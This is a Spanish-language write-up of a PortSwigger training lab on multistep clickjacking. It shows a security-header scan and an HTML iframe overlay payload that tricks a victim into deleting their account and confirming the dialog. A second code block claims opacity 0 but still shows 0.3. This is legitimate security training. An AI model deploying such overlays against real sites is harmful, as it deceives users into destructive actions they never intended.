---
title: Multistep clickjacking
description: Laboratorio de Portswigger sobre Clickjacking
date: 2025-04-01 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Clickjacking
tags:
  - Portswigger Labs
  - Clickjacking
  - Multistep clickjacking
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` tiene una funcionalidad de `cuenta` protegida por un `token CSRF` y un `diálogo de confirmación` para defenderse contra el `Clickjacking`. Para `resolver` este `laboratorio`, debemos realizar un `ataque de Clickjacking` que engañe al `usuario` para que haga click en el `botón de eliminación de cuenta` y en el `diálogo de confirmación`, utilizando las acciones señuelo `"Click me first"` y `"Click me next"`. Necesitaremos usar `dos elementos` para este `laboratorio`. Podemos `iniciar sesión` en la `cuenta` utilizando las credenciales `wiener:peter`

---

## Guía de clickjacking

`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de clickjacking` [https://justice-reaper.github.io/posts/Clickjacking-Guide/](https://justice-reaper.github.io/posts/Clickjacking-Guide/)

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/Clickjacking-Lab-5/image_1.png)

Hacemos `click` sobre `My account` y nos logueamos con las credenciales `wiener:peter`

![](/assets/img/Clickjacking-Lab-5/image_2.png)

Vemos que podemos `cambiar` nuestro `email` y que podemos `eliminar` la `cuenta`

![](/assets/img/Clickjacking-Lab-5/image_3.png)

Si pulsamos sobre `Delete account` nos `pide` una `confirmación` para `eliminar` nuestra `cuenta`

![](/assets/img/Clickjacking-Lab-5/image_4.png)

Si pulsamos sobre `View post` vemos que hay una `sección` de `comentarios`

![](/assets/img/Clickjacking-Lab-5/image_5.png)

Para ver si una `web` es `vulnerable` a `Clickjacking` podemos usar la herramienta `shcheck` [https://github.com/santoru/shcheck.git](https://github.com/santoru/shcheck.git()) para `identificar` las `cabeceras de seguridad`

```
# shcheck.py -i -x -k https://0adf00d004447ab3839b46d000cc000b.web-security-academy.net/   

======================================================
 > shcheck.py - santoru ..............................
------------------------------------------------------
 Simple tool to check security headers on a webserver 
======================================================

[*] Analyzing headers of https://0adf00d004447ab3839b46d000cc000b.web-security-academy.net/
[!] URL Returned an HTTP error: 404
[*] Effective URL: https://0adf00d004447ab3839b46d000cc000b.web-security-academy.net/
[!] Missing security header: X-XSS-Protection
[!] Missing security header: X-Frame-Options
[!] Missing security header: X-Content-Type-Options
[!] Missing security header: Strict-Transport-Security
[!] Missing security header: Content-Security-Policy
[!] Missing security header: X-Permitted-Cross-Domain-Policies
[!] Missing security header: Referrer-Policy
[!] Missing security header: Expect-CT
[!] Missing security header: Permissions-Policy
[!] Missing security header: Cross-Origin-Embedder-Policy
[!] Missing security header: Cross-Origin-Resource-Policy
[!] Missing security header: Cross-Origin-Opener-Policy

[*] No information disclosure headers detected

[*] No caching headers detected
-------------------------------------------------------
[!] Headers analyzed for https://0adf00d004447ab3839b46d000cc000b.web-security-academy.net/
[+] There are 0 security headers
[-] There are not 12 security headers
```

Si preferimos usar una herramienta `web` podemos usar `securityheaders` [https://securityheaders.com/](https://securityheaders.com/) 

![](/assets/img/Clickjacking-Lab-5/image_6.png)

En este caso, vemos que la `web` no tiene ni `Content-Security-Policy (CSP)` ni `X-Frame-Options`, lo cual la hace vulnerable a `Clickjacking`

Hay veces en las que `el atacante necesita que el usuario víctima realice múltiples clicks`. Por ejemplo, un `atacante` podría querer `engañar` a un `usuario` para que `compre algo` en un `sitio web de ventas`, por lo que los `artículos` deben `añadirse` a un `carrito de compras` antes de `realizar el pedido` y posteriormente se necesitaría otro `click` para `procesar` el `pago`

Estas `acciones` pueden ser `implementadas` por el `atacante` utilizando múltiples `iframes`. Estos `ataques` requieren una `precisión considerable` y `cuidado` desde la `perspectiva del atacante` si se quiere que sean `efectivos` y `sigilosos`

Nos dirigimos al `Exploit server` y nos `creamos` este `payload`

```
<style>
	iframe {
		position:relative;
		width:400;
		height: 550;
		opacity: 0.3;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:495;
		left:150;
		z-index: 1;
	}
   .secondClick {
		top:315;
		left:155;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a77006f03f4bcd5893ea08800a90071.web-security-academy.net/my-account"></iframe>
```

![](/assets/img/Clickjacking-Lab-5/image_7.png)

Pulsamos sobre `View exploit` para comprobar que está bien `centrado` el `texto`

![](/assets/img/Clickjacking-Lab-5/image_8.png)

![](/assets/img/Clickjacking-Lab-5/image_9.png)

Una vez que hemos comprobado que está bien `centrado`, le `cambiamos` la `opacidad` a `0`

```
<style>
	iframe {
		position:relative;
		width:400;
		height: 550;
		opacity: 0.3;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:495;
		left:150;
		z-index: 1;
	}
   .secondClick {
		top:315;
		left:155;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a77006f03f4bcd5893ea08800a90071.web-security-academy.net/my-account"></iframe>
```

![](/assets/img/Clickjacking-Lab-5/image_10.png)

Si pulsamos sobre `View exploit` así es como se vería

![](/assets/img/Clickjacking-Lab-5/image_11.png)

Otra forma alternativa sería usando la herramienta `Clickbandit` de `Burpsuite`, para usarla nos dirigimos a `Burpsuite` y pulsamos `Burp > Burp Clickbandit`

![](/assets/img/Clickjacking-Lab-5/image_12.png)

Pulsamos sobre `Copy Clickbandit to clipboard`

![](/assets/img/Clickjacking-Lab-5/image_13.png)

Nos dirigimos a `Chrome`, accedemos a `My account`, nos `logueamos`, abrimos la `consola de desarrollador` y `pegamos` ahí todo el `código`

![](/assets/img/Clickjacking-Lab-5/image_14.png)

Una vez hecho esto nos saldrá este `menú`

![](/assets/img/Clickjacking-Lab-5/image_15.png)

Pulsamos en `Start` y posteriormente hacemos `click` sobre `Delete account`

![](/assets/img/Clickjacking-Lab-5/image_16.png)

El siguiente paso es marcar la casilla `Disable click actions` y pulsar sobre `Yes`

![](/assets/img/Clickjacking-Lab-5/image_17.png)

![](/assets/img/Clickjacking-Lab-5/image_18.png)

Una vez hecho esto, `pulsamos` sobre `Finish` y se nos `mostrará` como es nuestro `payload` actualmente. Para `ver` la `segunda parte` necesitamos hacer `click` en `Delete account`

![](/assets/img/Clickjacking-Lab-5/image_19.png)

![](/assets/img/Clickjacking-Lab-5/image_20.png)

Usando los símbolos `-` y `+`, podemos `subir` o `bajar` el `aumento`, y con `Toogle transparency` podemos `activar` o `desactivar` la `transparencia`. En mi caso, lo voy a dejar de esta forma. Cuando ya lo tengamos como queremos, pulsamos en `Save` y se nos `descargará` un `documento HTML`

![](/assets/img/Clickjacking-Lab-5/image_21.png)

`Pegamos` el `código` en el `Exploit server`

![](/assets/img/Clickjacking-Lab-5/image_22.png)

Pulsamos sobre `View exploit` para ver si se ve correctamente. Una vez que hemos `comprobado` que `funcionan` ambos `payloads`, nos dirigimos al `Exploit server` y pulsamos sobre `Deliver exploit to victim`

![](/assets/img/Clickjacking-Lab-5/image_23.png)

![](/assets/img/Clickjacking-Lab-5/image_24.png)

![](/assets/img/Clickjacking-Lab-5/image_25.png)
